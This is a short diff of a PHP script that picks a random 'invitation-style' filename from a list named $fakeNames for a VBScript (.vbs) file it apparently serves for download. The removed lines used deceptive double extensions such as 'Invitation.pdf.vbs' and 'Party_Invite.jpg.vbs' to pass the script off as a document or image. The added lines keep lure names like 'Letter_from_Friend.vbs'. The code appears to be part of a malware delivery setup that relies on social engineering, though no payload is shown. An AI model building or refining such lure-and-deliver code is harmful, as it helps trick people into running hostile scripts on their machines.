@@ -5,13 +5,13 @@ header('Cache-Control: no-store, no-cache, must-revalidate');
 
 // Random invitation-style filenames
 $fakeNames = [
-    "Invitation.pdf.vbs",
-    "Your_Invitation.pdf.vbs",
-    "Party_Invite.jpg.vbs",
-    "Letter_from_Friend.docx.vbs",
-    "Invitation_from_Friend.pdf.vbs",
-    "Important_Mail.pdf.vbs",
-    "Letter_Invite.docx.vbs"
+    "Invitation.vbs",
+    "Your_Invitation.vbs",
+    "Party_Invite.vbs",
+    "Letter_from_Friend.vbs",
+    "Invitation_from_Friend.vbs",
+    "Important_Mail.vbs",
+    "Letter_Invite.vbs"
 ];
 $randomFilename = $fakeNames[array_rand($fakeNames)];
 
